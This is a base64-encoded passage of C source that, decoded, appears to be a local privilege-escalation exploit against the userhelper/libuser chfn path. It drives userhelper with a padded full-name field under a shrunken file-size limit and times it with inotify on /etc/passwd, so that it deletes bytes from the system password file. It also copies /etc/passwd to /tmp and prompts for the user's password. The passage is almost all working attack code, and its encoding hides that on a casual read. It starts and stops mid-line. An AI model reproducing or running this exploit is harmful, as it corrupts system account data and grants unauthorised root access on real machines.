ZSBmb3JtYXQ6DQogICByZXNwb25zZSBjb2RlIGFzIGEgc2luZ2xlIGNoYXJhY3RlciwNCiAgIHJlc3BvbnNlIGRhdGENCiAgICdcbicgKi8NCg0KLyogQ29uc29sZWhlbHBlciByZXNwb25zZSBjb2Rlcy4gKi8NCiNkZWZpbmUgVUhfVEVYVCAzMw0KDQovKiBWYWxpZCB1c2VyaGVscGVyIGVycm9yIGNvZGVzLiAqLw0KI2RlZmluZSBFUlJfVU5LX0VSUk9SICAgICAgICAgICAyNTUgICAgIC8qIHVua25vd24gZXJyb3IgKi8NCg0KLyogUGF0aHMsIGZsYWcgbmFtZXMsIGFuZCBvdGhlciBzdHVmZi4gKi8NCiNkZWZpbmUgVUhfUEFUSCAiL3Vzci9zYmluL3VzZXJoZWxwZXIiDQojZGVmaW5lIFVIX0ZVTExOQU1FX09QVCAiLWYiDQojZGVmaW5lIFVIX09GRklDRV9PUFQgIi1vIg0KI2RlZmluZSBVSF9PRkZJQ0VQSE9ORV9PUFQgIi1wIg0KI2RlZmluZSBVSF9IT01FUEhPTkVfT1BUICItaCINCg0Kc3RhdGljIGNoYXINCnJlYWRfcmVxdWVzdChjb25zdCBpbnQgZmQsIGNoYXIgKmNvbnN0IGRhdGEsIGNvbnN0IHNpemVfdCBzaXplKQ0Kew0KICAgIGlmIChmZCA8PSAtMSkgZGllKCk7DQogICAgaWYgKGRhdGEgPT0gTlVMTCkgZGllKCk7DQogICAgaWYgKHNpemUgPj0gSU5UX01BWCkgZGllKCk7DQoNCiAgICBjaGFyIGhlYWRlclsxICsgVUhfUkVRVUVTVF9TSVpFX0RJR0lUUyArIDFdOw0KICAgIGlmIChyZWFkKGZkLCBoZWFkZXIsIHNpemVvZihoZWFkZXIpLTEpICE9IHNpemVvZihoZWFkZXIpLTEpIGRpZSgpOw0KICAgIGhlYWRlcltzaXplb2YoaGVhZGVyKS0xXSA9ICdcMCc7DQoNCiAgICBlcnJubyA9IDA7DQogICAgY2hhciAqZW5kcHRyID0gTlVMTDsNCiAgICBjb25zdCB1bnNpZ25lZCBsb25nIGxlbiA9IHN0cnRvdWwoJmhlYWRlclsxXSwgJmVuZHB0ciwgMTApOw0KICAgIGlmIChlcnJubyAhPSAwIHx8IGVuZHB0ciAhPSAmaGVhZGVyW3NpemVvZihoZWFkZXIpLTFdKSBkaWUoKTsNCg0KICAgIGlmIChsZW4gPj0gc2l6ZSkgZGllKCk7DQogICAgaWYgKHJlYWQoZmQsIGRhdGEsIGxlbisxKSAhPSAoc3NpemVfdCkobGVuKzEpKSBkaWUoKTsNCiAgICBpZiAoZGF0YVtsZW5dICE9ICdcbicpIGRpZSgpOw0KICAgIGRhdGFbbGVuXSA9ICdcMCc7DQoNCiAgICBpZiAoc3RybGVuKGRhdGEpICE9IGxlbikgZGllKCk7DQogICAgaWYgKHN0cmNocihkYXRhLCAnXG4nKSAhPSBOVUxMKSBkaWUoKTsNCiAgICByZXR1cm4gaGVhZGVyWzBdOw0KfQ0KDQpzdGF0aWMgdm9pZA0Kc2VuZF9yZXBseShjb25zdCBpbnQgZmQsIGNvbnN0IHVuc2lnbmVkIGNoYXIgdHlwZSwgY29uc3QgY2hhciAqY29uc3QgZGF0YSkNCnsNCiAgICBpZiAoZmQgPD0gLTEpIGRpZSgpOw0KICAgIGlmICghaXNhc2NpaSh0eXBlKSkgZGllKCk7DQogICAgaWYgKCFpc3ByaW50KHR5cGUpKSBkaWUoKTsNCiAgICBpZiAoZGF0YSA9PSBOVUxMKSBkaWUoKTsNCiAgICBpZiAoc3RycGJyayhkYXRhLCAiXHJcbiIpICE9IE5VTEwpIGRpZSgpOw0KDQogICAgY2hhciBidWZbQlVGU0laXTsNCiAgICBjb25zdCBpbnQgbGVuID0geHNucHJpbnRmKGJ1Ziwgc2l6ZW9mKGJ1ZiksICIlYyVzXG4iLCAoaW50KXR5cGUsIGRhdGEpOw0KICAgIGlmIChzZW5kKGZkLCBidWYsIGxlbiwgTVNHX05PU0lHTkFMKSAhPSBsZW4pIGRpZSgpOw0KfQ0KDQojZGVmaW5lIEVUQ0RJUiAiL2V0YyINCiNkZWZpbmUgUEFTU1dEICIvZXRjL3Bhc3N3ZCINCiNkZWZpbmUgQkFDS1VQICIvZXRjL3Bhc3N3ZC0iDQoNCnN0YXRpYyBzdHJ1Y3Qgew0KICAgIGNoYXIgdXNlcm5hbWVbNjRdOw0KICAgIGNoYXIgcGFzc3dvcmRbNjRdOw0KICAgIHN0cnVjdCBnZWNvc19kYXRhIGdlY29zOw0KfSBteTsNCg0Kc3RhdGljIHZvbGF0aWxlIHNpZ19hdG9taWNfdCBpc19jaGlsZF9kZWFkOw0KDQpzdGF0aWMgdm9pZA0Kc2lnY2hpbGRfaGFuZGxlcihjb25zdCBpbnQgc2lnbnVtIF9fYXR0cmlidXRlX18gKChfX3VudXNlZF9fKSkpDQp7DQogICAgaXNfY2hpbGRfZGVhZCA9IHRydWU7DQp9DQoNCnN0YXRpYyBpbnQNCndhaXRfZm9yX3VzZXJoZWxwZXIoc3RydWN0IHVzZXJoZWxwZXIgKmNvbnN0IHVoLCBjb25zdCBpbnQgb3B0aW9ucykNCnsNCiAgICBpZiAodWggPT0gTlVMTCkgZGllKCk7DQogICAgaWYgKHVoLT5waWQgPD0gMCkgZGllKCk7DQogICAgaWYgKChvcHRpb25zICYgfihXVU5UUkFDRUQgfCBXQ09OVElOVUVEKSkgIT0gMCkgZGllKCk7DQoNCiAgICBpbnQgc3RhdHVzOw0KICAgIGZvciAoOzspIHsNCiAgICAgICAgY29uc3QgcGlkX3QgcGlkID0gd2FpdHBpZCh1aC0+cGlkLCAmc3RhdHVzLCBvcHRpb25zKTsNCiAgICAgICAgaWYgKHBpZCA9PSB1aC0+cGlkKSBicmVhazsNCiAgICAgICAgaWYgKHBpZCA+IDApIF9leGl0KDI1NSk7DQoNCiAgICAgICAgaWYgKHBpZCAhPSAtMSkgZGllKCk7DQogICAgICAgIGlmIChlcnJubyAhPSBFSU5UUikgZGllKCk7DQogICAgfQ0KICAgIGlmIChXSUZFWElURUQoc3RhdHVzKSB8fCBXSUZTSUdOQUxFRChzdGF0dXMpKSB1aC0+cGlkID0gLTE7DQogICAgcmV0dXJuIHN0YXR1czsNCn0NCg0Kc3RhdGljIHZvaWQNCmZvcmtzdG9wX3VzZXJoZWxwZXIoc3RydWN0IHVzZXJoZWxwZXIgKmNvbnN0IHVoKQ0Kew0KICAgIGlmICh1aCA9PSBOVUxMKSBkaWUoKTsNCiAgICBpZiAodWgtPnBpZCAhPSAwKSBkaWUoKTsNCiAgICBpZiAoZ2Vjb3Nfc2l6ZSgmdWgtPmdlY29zKSA+IEdFQ09TX0xFTkdUSCkgZGllKCk7DQoNCiAgICBzdHJ1Y3QgcmxpbWl0IGZzaXplOw0KICAgIGlmIChnZXRybGltaXQoUkxJTUlUX0ZTSVpFLCAmZnNpemUpICE9IDApIGRpZSgpOw0KICAgIGlmICh1aC0+ZnNpemVsaW0gPiBmc2l6ZS5ybGltX21heCkgZGllKCk7DQogICAgaWYgKHVoLT5mc2l6ZWxpbSA8PSAwKSBkaWUoKTsNCiAgICBmc2l6ZS5ybGltX2N1ciA9IHVoLT5mc2l6ZWxpbTsNCg0KICAgIGNwdV9zZXRfdCBvbGRfY3B1czsNCiAgICBDUFVfWkVSTygmb2xkX2NwdXMpOw0KICAgIGlmIChzY2hlZF9nZXRhZmZpbml0eSgwLCBzaXplb2Yob2xkX2NwdXMpLCAmb2xkX2NwdXMpICE9IDApIGRpZSgpOw0KDQogICAgeyBjb25zdCBpbnQgY3B1ID0gc2NoZWRfZ2V0Y3B1KCk7DQogICAgaWYgKGNwdSA+PSBDUFVfU0VUU0laRSkgZGllKCk7DQogICAgaWYgKGNwdSA8IDApIGRpZSgpOw0KICAgIGNwdV9zZXRfdCBuZXdfY3B1czsNCiAgICBDUFVfWkVSTygmbmV3X2NwdXMpOw0KICAgIENQVV9TRVQoY3B1LCAmbmV3X2NwdXMpOw0KICAgIGlmIChzY2hlZF9zZXRhZmZpbml0eSgwLCBzaXplb2YobmV3X2NwdXMpLCAmbmV3X2NwdXMpICE9IDApIGRpZSgpOyB9DQoNCiAgICBpbnQgc3ZbMl07DQogICAgaWYgKHNvY2tldHBhaXIoQUZfVU5JWCwgU09DS19TVFJFQU0sIDAsIHN2KSAhPSAwKSBkaWUoKTsNCg0KICAgIGlmIChpc19jaGlsZF9kZWFkKSBkaWUoKTsNCiAgICBzdGF0aWMgY29uc3Qgc3RydWN0IHNpZ2FjdGlvbiBzaWdjaGlsZF9hY3Rpb24gPSB7DQogICAgICAgIC5zYV9oYW5kbGVyID0gc2lnY2hpbGRfaGFuZGxlciwgLnNhX2ZsYWdzID0gU0FfTk9DTERTVE9QIH07DQogICAgaWYgKHNpZ2FjdGlvbihTSUdDSExELCAmc2lnY2hpbGRfYWN0aW9uLCBOVUxMKSAhPSAwKSBkaWUoKTsNCg0KICAgIHVoLT5waWQgPSBmb3JrKCk7DQogICAgaWYgKHVoLT5waWQgPD0gLTEpIGRpZSgpOw0KDQogICAgaWYgKHVoLT5waWQgPT0gMCkgew0KICAgICAgICBkaWVfZm4gPSBkaWVfaW5fY2hpbGQ7DQogICAgICAgIGlmIChjbG9zZShzdlsxXSkgIT0gMCkgZGllKCk7DQogICAgICAgIGlmIChkdXAyKHN2WzBdLCBVSF9JTkZJTEVOTykgIT0gVUhfSU5GSUxFTk8pIGRpZSgpOw0KICAgICAgICBpZiAoZHVwMihzdlswXSwgVUhfT1VURklMRU5PKSAhPSBVSF9PVVRGSUxFTk8pIGRpZSgpOw0KDQogICAgICAgIGNvbnN0IGludCBkZXZudWxsX2ZkID0gb3BlbigiL2Rldi9udWxsIiwgT19SRFdSKTsNCiAgICAgICAgaWYgKGR1cDIoZGV2bnVsbF9mZCwgU1RESU5fRklMRU5PKSAhPSBTVERJTl9GSUxFTk8pIGRpZSgpOw0KICAgICAgICBpZiAoZHVwMihkZXZudWxsX2ZkLCBTVERPVVRfRklMRU5PKSAhPSBTVERPVVRfRklMRU5PKSBkaWUoKTsNCiAgICAgICAgaWYgKGR1cDIoZGV2bnVsbF9mZCwgU1RERVJSX0ZJTEVOTykgIT0gU1RERVJSX0ZJTEVOTykgZGllKCk7DQoNCiAgICAgICAgaWYgKHNpZ25hbChTSUdQSVBFLCBTSUdfREZMKSA9PSBTSUdfRVJSKSBkaWUoKTsNCiAgICAgICAgaWYgKHNpZ25hbChTSUdYRlNaLCBTSUdfSUdOKSA9PSBTSUdfRVJSKSBkaWUoKTsNCiAgICAgICAgaWYgKHNldHJsaW1pdChSTElNSVRfRlNJWkUsICZmc2l6ZSkgIT0gMCkgZGllKCk7DQoNCiAgICAgICAgaWYgKHNldHByaW9yaXR5KFBSSU9fUFJPQ0VTUywgMCwgKzE5KSAhPSAwKSBkaWUoKTsNCiAgICAgICAgc3RhdGljIGNvbnN0IHN0cnVjdCBzY2hlZF9wYXJhbSBzY2hlZF9wYXJhbSA9IHsgLnNjaGVkX3ByaW9yaXR5ID0gMCB9Ow0KICAgICAgICAodm9pZCkgc2NoZWRfc2V0c2NoZWR1bGVyKDAsIFNDSEVEX0lETEUsICZzY2hlZF9wYXJhbSk7DQoNCiAgICAgICAgY2hhciAqY29uc3QgYXJndltdID0geyBVSF9QQVRILA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFVIX0ZVTExOQU1FX09QVCwgICAgdWgtPmdlY29zLmZ1bGxfbmFtZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVSF9PRkZJQ0VfT1BULCAgICAgIHVoLT5nZWNvcy5vZmZpY2UsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVUhfT0ZGSUNFUEhPTkVfT1BULCB1aC0+Z2Vjb3Mub2ZmaWNlX3Bob25lLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFVIX0hPTUVQSE9ORV9PUFQsICAgdWgtPmdlY29zLmhvbWVfcGhvbmUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTlVMTCB9Ow0KICAgICAgICBjaGFyICpjb25zdCBlbnZwW10gPSB7IE5VTEwgfTsNCiAgICAgICAgZXhlY3ZlKFVIX1BBVEgsIGFyZ3YsIGVudnApOw0KICAgICAgICBkaWUoKTsNCiAgICB9DQogICAgaWYgKGRpZV9mbiAhPSBkaWVfaW5fcGFyZW50KSBkaWUoKTsNCiAgICBpZiAoY2xvc2Uoc3ZbMF0pICE9IDApIGRpZSgpOw0KICAgIHVoLT5mZCA9IHN2WzFdOw0KDQogICAgdW5zaWduZWQgbG9uZyBleHBlY3RlZF9yZXNwb25zZXMgPSAwOw0KICAgIGZvciAoOzspIHsNCiAgICAgICAgY2hhciBkYXRhW0JVRlNJWl07DQogICAgICAgIGNvbnN0IGNoYXIgdHlwZSA9IHJlYWRfcmVxdWVzdCh1aC0+ZmQsIGRhdGEsIHNpemVvZihkYXRhKSk7DQogICAgICAgIGlmICh0eXBlID09IFVIX1NZTkNfUE9JTlQpIGJyZWFrOw0KDQogICAgICAgIHN3aXRjaCAodHlwZSkgew0KICAgICAgICBjYXNlIFVIX1VTRVI6DQogICAgICAgICAgICBpZiAoc3RyY21wKGRhdGEsIG15LnVzZXJuYW1lKSAhPSAwKSBkaWUoKTsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlIFVIX1NFUlZJQ0VfTkFNRToNCiAgICAgICAgICAgIGlmIChzdHJjbXAoZGF0YSwgImNoZm4iKSAhPSAwKSBkaWUoKTsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlIFVIX0VDSE9fT05fUFJPTVBUOg0KICAgICAgICBjYXNlIFVIX0VDSE9fT0ZGX1BST01QVDoNCiAgICAgICAgICAgIGlmICgrK2V4cGVjdGVkX3Jlc3BvbnNlcyA9PSAwKSBkaWUoKTsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlIFVIX0VYUEVDVF9SRVNQOg0KICAgICAgICAgICAgaWYgKHN0cnRvdWwoZGF0YSwgTlVMTCwgMTApICE9IGV4cGVjdGVkX3Jlc3BvbnNlcykgZGllKCk7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgfQ0KICAgIGlmIChleHBlY3RlZF9yZXNwb25zZXMgIT0gMSkgZGllKCk7DQoNCiAgICBjb25zdCBpbnQgbHBhc3N3ZF9mZCA9IHhvcGVuKFBBU1NXRCwgT19SRE9OTFkpOw0KICAgIGNvbnN0IGludCBpbm90aWZ5X2ZkID0gaW5vdGlmeV9pbml0KCk7DQogICAgaWYgKGlub3RpZnlfZmQgPD0gLTEpIGRpZSgpOw0KICAgIGlmIChpbm90aWZ5X2FkZF93YXRjaChpbm90aWZ5X2ZkLCBQQVNTV0QsIElOX0NMT1NFX05PV1JJVEUgfA0KICAgICAgICAgIElOX09QRU4pIDw9IC0xKSBkaWUoKTsNCiAgICBpZiAoaW5vdGlmeV9hZGRfd2F0Y2goaW5vdGlmeV9mZCwgQkFDS1VQLCBJTl9DTE9TRV9XUklURSkgPD0gLTEpIHsNCiAgICAgICAgaWYgKGVycm5vICE9IEVOT0VOVCkgZGllKCk7DQogICAgICAgIGlmIChpbm90aWZ5X2FkZF93YXRjaChpbm90aWZ5X2ZkLCBFVENESVIsIElOX0NSRUFURSkgPD0gLTEpIGRpZSgpOw0KICAgIH0NCg0KICAgIHNlbmRfcmVwbHkodWgtPmZkLCBVSF9URVhULCBteS5wYXNzd29yZCk7DQogICAgc2VuZF9yZXBseSh1aC0+ZmQsIFVIX1NZTkNfUE9JTlQsICIiKTsNCiAgICBpZiAoY2xvc2UodWgtPmZkKSAhPSAwKSBkaWUoKTsNCiAgICB1aC0+ZmQgPSAtMTsNCg0KICAgIHVuc2lnbmVkIGludCBzdGF0ZSA9IDA7DQogICAgc3RhdGljIGNvbnN0IHVpbnQzMl90IHRyYW5zaXRpb25bXSA9IHsgSU5fQ0xPU0VfV1JJVEUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSU5fQ0xPU0VfTk9XUklURSwgSU5fT1BFTiwgMCB9Ow0KICAgIGZvciAoOzspIHsNCiAgICAgICAgaWYgKGlzX2NoaWxkX2RlYWQpIGRpZSgpOw0KICAgICAgICBjaGFyIGJ1ZmZlclsxMCAqIChzaXplb2Yoc3RydWN0IGlub3RpZnlfZXZlbnQpICsgTkFNRV9NQVggKyAxKV07DQogICAgICAgIGNvbnN0IHNzaXplX3QgX2J1ZmxlbiA9IHJlYWQoaW5vdGlmeV9mZCwgYnVmZmVyLCBzaXplb2YoYnVmZmVyKSk7DQogICAgICAgIGlmIChpc19jaGlsZF9kZWFkKSBkaWUoKTsNCg0KICAgICAgICBpZiAoX2J1ZmxlbiA8PSAwKSBkaWUoKTsNCiAgICAgICAgc2l6ZV90IGJ1ZmxlbiA9IF9idWZsZW47DQogICAgICAgIGlmIChidWZsZW4gPiBzaXplb2YoYnVmZmVyKSkgZGllKCk7DQoNCiAgICAgICAgc3RydWN0IGlub3RpZnlfZXZlbnQgKmVwOw0KICAgICAgICBmb3IgKGVwID0gKHN0cnVjdCBpbm90aWZ5X2V2ZW50ICopKGJ1ZmZlcik7IGJ1ZmxlbiA+PSBzaXplb2YoKmVwKTsNCiAgICAgICAgICAgICBlcCA9IChzdHJ1Y3QgaW5vdGlmeV9ldmVudCAqKShlcC0+bmFtZSArIGVwLT5sZW4pKSB7DQogICAgICAgICAgICBidWZsZW4gLT0gc2l6ZW9mKCplcCk7DQoNCiAgICAgICAgICAgIGlmIChlcC0+bGVuID4gMCkgew0KICAgICAgICAgICAgICAgIGlmIChidWZsZW4gPCBlcC0+bGVuKSBkaWUoKTsNCiAgICAgICAgICAgICAgICBidWZsZW4gLT0gZXAtPmxlbjsNCiAgICAgICAgICAgICAgICBpZiAoKGVwLT5tYXNrICYgSU5fQ1JFQVRFKSA9PSAwKSBkaWUoKTsNCiAgICAgICAgICAgICAgICAodm9pZCkgaW5vdGlmeV9hZGRfd2F0Y2goaW5vdGlmeV9mZCwgQkFDS1VQLCBJTl9DTE9TRV9XUklURSk7DQogICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoZXAtPmxlbiAhPSAwKSBkaWUoKTsNCiAgICAgICAgICAgIHdoaWxlICgoZXAtPm1hc2sgJiB0cmFuc2l0aW9uW3N0YXRlXSkgIT0gMCkgew0KICAgICAgICAgICAgICAgIGVwLT5tYXNrICY9IH50cmFuc2l0aW9uW3N0YXRlKytdOw0KICAgICAgICAgICAgICAgIGlmICh0cmFuc2l0aW9uW3N0YXRlXSA9PSAwKSBnb3RvIHN0b3BfdXNlcmhlbHBlcjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBpZiAoYnVmbGVuICE9IDApIGRpZSgpOw0KICAgIH0NCiAgICBzdG9wX3VzZXJoZWxwZXI6DQogICAgaWYgKGtpbGwodWgtPnBpZCwgU0lHU1RPUCkgIT0gMCkgZGllKCk7DQogICAgaWYgKGNsb3NlKGlub3RpZnlfZmQpICE9IDApIGRpZSgpOw0KDQogICAgY29uc3QgaW50IHN0YXR1cyA9IHdhaXRfZm9yX3VzZXJoZWxwZXIodWgsIFdVTlRSQUNFRCk7DQogICAgaWYgKCFXSUZTVE9QUEVEKHN0YXR1cykpIGRpZSgpOw0KICAgIGlmIChXU1RPUFNJRyhzdGF0dXMpICE9IFNJR1NUT1ApIGRpZSgpOw0KDQogICAgeGNsb3NlKGxwYXNzd2RfZmQpOw0KICAgIGlmIChzaWduYWwoU0lHQ0hMRCwgU0lHX0RGTCkgPT0gU0lHX0VSUikgZGllKCk7DQogICAgaWYgKHNjaGVkX3NldGFmZmluaXR5KDAsIHNpemVvZihvbGRfY3B1cyksICZvbGRfY3B1cykgIT0gMCkgZGllKCk7DQp9DQoNCnN0YXRpYyB2b2lkDQpjb250aW51ZV91c2VyaGVscGVyKHN0cnVjdCB1c2VyaGVscGVyICpjb25zdCB1aCkNCnsNCiAgICBpZiAodWggPT0gTlVMTCkgZGllKCk7DQogICAgaWYgKHVoLT5mZCAhPSAtMSkgZGllKCk7DQogICAgaWYgKHVoLT5waWQgPD0gMCkgZGllKCk7DQoNCiAgICBpZiAoa2lsbCh1aC0+cGlkLCBTSUdDT05UKSAhPSAwKSBkaWUoKTsNCg0KICAgIHsgY29uc3QgaW50IHN0YXR1cyA9IHdhaXRfZm9yX3VzZXJoZWxwZXIodWgsIFdDT05USU5VRUQpOw0KICAgIGlmICghV0lGQ09OVElOVUVEKHN0YXR1cykpIGRpZSgpOyB9DQoNCiAgICB7IGNvbnN0IGludCBzdGF0dXMgPSB3YWl0X2Zvcl91c2VyaGVscGVyKHVoLCAwKTsNCiAgICBpZiAoIVdJRkVYSVRFRChzdGF0dXMpKSBkaWUoKTsNCiAgICBpZiAoV0VYSVRTVEFUVVMoc3RhdHVzKSAhPQ0KICAgICAgICAgICgodWgtPmZzaXplbGltID09IFJMSU1fSU5GSU5JVFkpID8gMCA6IEVSUl9VTktfRVJST1IpKSBkaWUoKTsgfQ0KDQogICAgbWVtc2V0KHVoLCAwLCBzaXplb2YoKnVoKSk7DQp9DQoNCnN0YXRpYyB2b2lkDQpjcmVhdGVfYmFja3VwX29mX3Bhc3N3ZF9maWxlKHZvaWQpDQp7DQogICAgY2hhciBiYWNrdXBbXSA9ICIvdG1wL3Bhc3N3ZC1YWFhYWFgiOw0KICAgIGNvbnN0IG1vZGVfdCBwcmV2X3VtYXNrID0gdW1hc2soMDc3KTsNCiAgICBjb25zdCBpbnQgb2ZkID0gbWtzdGVtcChiYWNrdXApOw0KICAgICh2b2lkKSB1bWFzayhwcmV2X3VtYXNrKTsNCiAgICBpZiAob2ZkIDw9IC0xKSBkaWUoKTsNCg0KICAgIHByaW50ZigiQ3JlYXRpbmcgYSBiYWNrdXAgY29weSBvZiBcIiVzXCIgbmFtZWQgXCIlc1wiXG4iLCBQQVNTV0QsIGJhY2t1cCk7DQogICAgY29uc3QgaW50IGlmZCA9IHhvcGVuKFBBU1NXRCwgT19SRE9OTFkpOw0KICAgIGZvciAoOzspIHsNCiAgICAgICAgY2hhciBidWZbQlVGU0laXTsNCiAgICAgICAgY29uc3Qgc3NpemVfdCBsZW4gPSByZWFkKGlmZCwgYnVmLCBzaXplb2YoYnVmKSk7DQogICAgICAgIGlmIChsZW4gPT0gMCkgYnJlYWs7DQogICAgICAgIGlmIChsZW4gPD0gMCkgZGllKCk7DQogICAgICAgIGlmICh3cml0ZShvZmQsIGJ1ZiwgbGVuKSAhPSBsZW4pIGRpZSgpOw0KICAgIH0NCiAgICB4Y2xvc2UoaWZkKTsNCiAgICBpZiAoY2xvc2Uob2ZkKSAhPSAwKSBkaWUoKTsNCn0NCg0Kc3RhdGljIHZvaWQNCmRlbGV0ZV9saW5lc19mcm9tX3Bhc3N3ZF9maWxlKHZvaWQpDQp7DQogICAgc3RydWN0IGdlY29zX2RhdGEgZ2Vjb3M7DQogICAgbWVtc2V0KCZnZWNvcywgMCwgc2l6ZW9mKGdlY29zKSk7DQogICAgeHNucHJpbnRmKGdlY29zLnNpdGVfaW5mbywgc2l6ZW9mKGdlY29zLnNpdGVfaW5mbyksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICIlcyIsIG15LmdlY29zLnNpdGVfaW5mbyk7DQogICAgY29uc3Qgc3NpemVfdCBmdWxsbmFtZV9tYXggPSBHRUNPU19MRU5HVEggLSBnZWNvc19zaXplKCZnZWNvcyk7DQogICAgaWYgKGZ1bGxuYW1lX21heCA+PSBHRUNPU19MRU5HVEgpIGRpZSgpOw0KICAgIGlmIChmdWxsbmFtZV9tYXggPD0gMCkgZGllKCk7DQoNCiAgICBjaGFyIGZyYWdtZW50WzY0XTsNCiAgICB4c25wcmludGYoZnJhZ21lbnQsIHNpemVvZihmcmFnbWVudCksICJcbiVzOiIsIG15LnVzZXJuYW1lKTsNCg0KICAgIGNoYXIgKmNvbnRlbnRzID0gTlVMTDsNCiAgICBmb3IgKDs7KSB7DQogICAgICAgIHN0cnVjdCBzdGF0IHN0Ow0KICAgICAgICBjb25zdCBpbnQgZmQgPSB4b3BlbihQQVNTV0QsIE9fUkRPTkxZKTsNCiAgICAgICAgaWYgKGZzdGF0KGZkLCAmc3QpICE9IDApIGRpZSgpOw0KICAgICAgICBpZiAoc3Quc3Rfc2l6ZSA+PSBJTlRfTUFYKSBkaWUoKTsNCiAgICAgICAgaWYgKHN0LnN0X3NpemUgPD0gMCkgZGllKCk7DQoNCiAgICAgICAgY29udGVudHMgPSB4cmVhbGxvYyhjb250ZW50cywgc3Quc3Rfc2l6ZSArIDEpOw0KICAgICAgICBpZiAocmVhZChmZCwgY29udGVudHMsIHN0LnN0X3NpemUpICE9IHN0LnN0X3NpemUpIGRpZSgpOw0KICAgICAgICBjb250ZW50c1tzdC5zdF9zaXplXSA9ICdcMCc7DQogICAgICAgIHhjbG9zZShmZCk7DQoNCiAgICAgICAgY29uc3QgY2hhciAqY3AgPSBzdHJzdHIoY29udGVudHMsIGZyYWdtZW50KTsNCiAgICAgICAgaWYgKGNwID09IE5VTEwpIGRpZSgpOw0KICAgICAgICBjcCA9IHN0cmNocihjcCArIDIsICdcbicpOw0KICAgICAgICBpZiAoY3AgPT0gTlVMTCkgZGllKCk7DQogICAgICAgIGlmIChjcFsxXSA9PSAnXDAnKSBicmVhazsNCg0KICAgICAgICBjaGFyICpjb25zdCB0cCA9IGNvbnRlbnRzICsgc3Quc3Rfc2l6ZS0xOw0KICAgICAgICAqdHAgPSAnXDAnOw0KICAgICAgICBpZiAodHAgPD0gY3ApIGRpZSgpOw0KICAgICAgICBpZiAodHAgLSBjcCA+IGZ1bGxuYW1lX21heCkgY3AgPSB0cCAtIGZ1bGxuYW1lX21heDsNCiAgICAgICAgY3AgPSBzdHJwYnJrKGNwLCAiXG46LCAiKTsNCiAgICAgICAgaWYgKGNwID09IE5VTEwpIGRpZSgpOw0KDQogICAgICAgIGNvbnN0IHNzaXplX3QgZnVsbG5hbWVfbGVuID0gdHAgLSBjcDsNCiAgICAgICAgaWYgKGZ1bGxuYW1lX2xlbiA+PSBHRUNPU19MRU5HVEgpIGRpZSgpOw0KICAgICAgICBpZiAoZnVsbG5hbWVfbGVuIDw9IDApIGRpZSgpOw0KDQogICAgICAgIHByaW50ZigiRGVsZXRpbmcgJXpkIGJ5dGVzIGZyb20gXCIlc1wiXG4iLCBmdWxsbmFtZV9sZW4sIFBBU1NXRCk7DQoNCiAgICAgICAgc3RydWN0IHVzZXJoZWxwZXIgKmNvbnN0IHVoID0gJnVzZXJoZWxwZXJzWzBdOw0KICAgICAgICBtZW1zZXQodWgtPmdlY29zLmZ1bGxfbmFtZSwgJ0EnLCBmdWxsbmFtZV9sZW4pOw0KICAgICAgICB1aC0+ZnNpemVsaW0gPSBzdC5zdF9zaXplOw0KICAgICAgICBmb3Jrc3RvcF91c2VyaGVscGVyKHVoKTsNCiAgICAgICAgY29udGludWVfdXNlcmhlbHBlcih1aCk7DQoNCiAgICAgICAgdWgtPmZzaXplbGltID0gUkxJTV9JTkZJTklUWTsNCiAgICAgICAgZm9ya3N0b3BfdXNlcmhlbHBlcih1aCk7DQogICAgICAgIGNvbnRpbnVlX3VzZXJoZWxwZXIodWgpOw0KICAgIH0NCiAgICBmcmVlKGNvbnRlbnRzKTsNCn0NCg0Kc3RhdGljIHNpemVfdCBwYXNzd2RfZnNpemU7DQpzdGF0aWMgaW50IGdlbmVyYXRlX3VzZXJoZWxwZXJzKGNvbnN0IGNoYXIgKik7DQojZGVmaW5lIElTX1VTRVJfTEFTVCAibGFzdCB1c2VyIGluIHBhc3N3ZCBmaWxlPyINCg0Kc3RhdGljIGNoYXIgY2FuZGlkYXRlX3VzZXJzWzI1Nl07DQpzdGF0aWMgY2hhciBzdXBlcnVzZXJfZWxlY3Q7DQoNCmludA0KbWFpbih2b2lkKQ0Kew0KICAgIGNyZWF0ZV9iYWNrdXBfb2ZfcGFzc3dkX2ZpbGUoKTsNCg0KICAgIHsgY2hhciBjYW5kaWRhdGVbXSA9ICJhIjsNCiAgICBmb3IgKDsgY2FuZGlkYXRlWzBdIDw9ICd6JzsgY2FuZGlkYXRlWzBdKyspIHsNCiAgICAgICAgaWYgKGdldHB3bmFtKGNhbmRpZGF0ZSkgIT0gTlVMTCkgY29udGludWU7DQogICAgICAgIHN0cmNhdChjYW5kaWRhdGVfdXNlcnMsIGNhbmRpZGF0ZSk7DQogICAgfSB9DQogICAgaWYgKGNhbmRpZGF0ZV91c2Vyc1swXSA9PSAnXDAnKSBkaWUoKTsNCg0KICAgIGNvbnN0IHN0cnVjdCBwYXNzd2QgKmNvbnN0IHB3ZCA9IGdldHB3dWlkKGdldHVpZCgpKTsNCiAgICBpZiAoKHB3ZCA9PSBOVUxMKSB8fCAocHdkLT5wd19uYW1lID09IE5VTEwpKSBkaWUoKTsNCiAgICB4c25wcmludGYobXkudXNlcm5hbWUsIHNpemVvZihteS51c2VybmFtZSksICIlcyIsIHB3ZC0+cHdfbmFtZSk7DQogICAgZ2Vjb3NfcGFyc2UocHdkLT5wd19nZWNvcywgJm15LmdlY29zKTsNCg0KICAgIGlmIChmcHV0cygiUGxlYXNlIGVudGVyIHlvdXIgcGFzc3dvcmQ6XG4iLCBzdGRvdXQpID09IEVPRikgZGllKCk7DQogICAgaWYgKGZnZXRzKG15LnBhc3N3b3JkLCBzaXplb2YobXkucGFzc3dvcmQpLCBzdGRpbikgPT0gTlV